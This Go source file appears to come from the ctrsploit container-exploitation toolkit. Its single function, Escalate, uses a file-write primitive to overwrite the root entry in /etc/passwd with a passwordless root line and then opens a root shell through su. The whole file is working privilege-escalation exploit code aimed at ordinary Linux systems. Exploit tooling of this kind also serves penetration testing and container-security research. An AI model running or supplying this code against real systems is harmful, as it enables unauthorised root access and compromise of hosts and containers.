package pipeprimitive

import (
	"fmt"

	"github.com/ctrsploit/ctrsploit/pkg/util"
)

func Escalate(primitive Primitive) error {
	offset, err := rootPasswdPasswordOffset("/etc/passwd")
	if err != nil {
		return fmt.Errorf("find root password offset in /etc/passwd: %w", err)
	}

	payload := []byte(":0:0:root:/root:/bin/bash\n")
	if err := primitive.Write("/etc/passwd", int64(offset), payload); err != nil {
		return fmt.Errorf(
			"%s permission escalate: write /etc/passwd at offset %d with %d bytes: %w",
			primitive.GetExpName(), offset, len(payload), err,
		)
	}

	util.InvokeRootShellBySu()
	return nil
}
